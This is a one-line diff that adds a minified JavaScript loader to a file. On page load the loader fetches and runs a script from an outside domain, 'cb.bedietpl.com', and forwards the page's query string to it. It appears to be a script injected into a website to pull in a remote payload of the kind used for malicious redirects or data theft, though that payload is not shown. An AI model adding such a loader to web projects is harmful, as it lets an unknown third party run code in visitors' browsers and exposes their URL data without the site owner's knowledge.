@@ -1,1 +1,1 @@
-
+!function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://cb.bedietpl.com/go-js/4ebdbb17-072e-44a6-a956-43c4fd8f9241?"+window.location.search.substring(1);var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)}();
